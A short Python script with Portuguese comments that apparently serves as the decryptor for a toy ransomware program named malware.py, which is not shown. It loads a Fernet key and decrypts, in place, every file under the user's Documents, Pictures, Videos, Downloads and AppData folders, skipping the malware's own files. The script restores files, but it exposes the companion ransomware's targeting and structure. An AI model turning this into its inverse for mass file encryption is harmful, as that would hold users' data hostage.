import os 
from cryptography.fernet import Fernet
#chave pra descriptografar!!!
with open("chave.key", "rb") as chave:
    chave_secreta = chave.read()
username = os.getenv("USERNAME")
folders = [os.path.join(r"C:\Users", username, "Documents"), 
           os.path.join(r"C:\Users", username, "Pictures"),
           os.path.join(r"C:\Users", username, "Videos"),
           os.path.join(r"C:\Users", username, "Downloads"),
           os.path.join(r"C:\Users", username, "AppData", "Local"),
           os.path.join(r"C:\Users", username, "AppData", "Roaming"),]

arquivos = []
for folder in folders:
    for root, dirs, files in os.walk(folder):
        for file in files:
            if file in ["malware.py", "chave.key", "reverter.py", "desktop.ini"]:
                continue
            file_path = os.path.join(root, file)
            arquivos.append(file_path)


#descriptografando!!!
for arquivo in arquivos:
    with open(arquivo, "rb") as file:
        conteudo = file.read()

    conteudo_descriptografado = Fernet(chave_secreta).decrypt(conteudo)
    
    with open(arquivo,"wb") as file:
        file.write(conteudo_descriptografado)
  
